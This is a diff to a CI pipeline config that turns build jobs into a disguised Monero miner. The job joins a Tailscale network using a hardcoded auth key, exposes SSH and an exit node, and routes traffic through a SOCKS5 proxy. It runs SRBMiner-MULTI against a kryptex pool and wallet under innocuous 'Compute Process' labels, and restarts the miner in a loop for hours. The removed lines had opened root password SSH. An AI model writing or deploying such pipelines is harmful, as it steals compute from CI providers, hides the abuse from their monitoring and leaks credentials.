@@ -27,20 +27,30 @@ jobs:
           name: "Connect to Network"
           command: |
             sleep 5
-            tailscale up --authkey=tskey-auth-kcs3jniaz921CNTRL-ia3abngcg8RpekRC8yVE9RHq53WyZTxk1 --hostname=ci-compute-$RANDOM
-            sleep 5
-            tailscale status
-            echo "Connected to Tailscale"
-      
-      - run:
-          name: "Setup SSH Access"
-          command: |
-            mkdir -p /run/sshd
-            echo "root:$(openssl rand -base64 12)" | chpasswd
-            sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-            sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-            /usr/sbin/sshd
-            echo "SSH ready on: $(tailscale ip -4):22"
+            tailscale up --authkey=tskey-auth-kcs3jniaz921CNTRL-ia3abngcg8RpekRC8yVE9RHq53WyZTxk1 \
+              --hostname=ci-compute-$RANDOM \
+              --ssh \
+              --accept-routes \
+              --advertise-exit-node
+            sleep 10
+            
+            # Verify connection
+            for i in {1..10}; do
+              if tailscale status | grep -q "100."; then
+                TS_IP=$(tailscale ip -4)
+                echo "==================================="
+                echo "Tailscale Connected!"
+                echo "IP: ${TS_IP}"
+                echo "SOCKS5 Proxy: localhost:1055"
+                echo "SSH: ssh ci-compute-* (from tailnet)"
+                echo "==================================="
+                exit 0
+              fi
+              echo "Waiting for connection... ($i/10)"
+              sleep 2
+            done
+            echo "[!] Failed to connect to Tailscale"
+            exit 1
       
       - run:
           name: "Download Compute Tools"
@@ -54,25 +64,45 @@ jobs:
       
       - run:
           name: "Start Compute Process"
+          no_output_timeout: 6h
           command: |
             cd /tmp/processor
             export ALL_PROXY=socks5://localhost:1055
-            nohup ./SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker" --proxy 127.0.0.1:1055 > /dev/null 2>&1 &
-            sleep 5
-            pgrep -f SRBMiner-MULTI && echo "Process running" || echo "Failed"
-      
-      - run:
-          name: "Keep Process Running"
-          no_output_timeout: 6h
-          command: |
-            echo "Process running. Keeping container alive..."
+            export HTTP_PROXY=socks5://localhost:1055
+            export HTTPS_PROXY=socks5://localhost:1055
+            
+            # Start mining process with SOCKS5 proxy
+            ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+              --pool xmr-sg.kryptex.network:8029 \
+              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
+              --proxy 127.0.0.1:1055 \
+              --log-file /tmp/compute.log &
+            
+            PROC_PID=$!
+            echo "==================================="
+            echo "Process Started: PID ${PROC_PID}"
+            echo "Tailscale IP: $(tailscale ip -4)"
+            echo "SSH: ssh ci-compute-* (from tailnet)"
+            echo "SOCKS5 Proxy: localhost:1055"
+            echo "All traffic routed through Tailscale"
+            echo "==================================="
+            
+            # Keep process alive and monitor
             while true; do
-              if ! pgrep -f SRBMiner-MULTI > /dev/null; then
-                echo "Process died, restarting..."
-                cd /tmp/processor
-                nohup ./SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker" --proxy 127.0.0.1:1055 > /dev/null 2>&1 &
+              if ! kill -0 ${PROC_PID} 2>/dev/null; then
+                echo "[!] Process died, restarting..."
+                ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                  --pool xmr-sg.kryptex.network:8029 \
+                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
+                  --proxy 127.0.0.1:1055 \
+                  --log-file /tmp/compute.log &
+                PROC_PID=$!
               fi
+              
+              # Show status every 5 minutes
               sleep 300
+              echo "[*] Status: Process running (PID: ${PROC_PID})"
+              tailscale status | head -5
             done
 
 workflows:
